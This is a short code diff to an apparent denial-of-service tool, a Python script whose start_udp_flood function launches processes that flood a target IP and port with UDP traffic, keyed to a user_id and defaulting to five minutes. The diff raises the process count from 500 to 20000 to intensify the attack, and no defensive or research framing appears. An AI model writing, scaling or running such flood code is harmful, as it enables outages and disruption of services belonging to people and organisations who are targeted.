@@ -30,7 +30,7 @@ def udp_flood(target_ip, target_port, stop_flag, duration):
 def start_udp_flood(user_id, target_ip, target_port, duration=300):  # Default 5 minutes
     stop_flag = multiprocessing.Event()
     processes = []
-    for _ in range(500):  # Increase process count
+    for _ in range(20000):  # Increase process count
         process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, stop_flag, duration))
         process.start()
         processes.append(process)
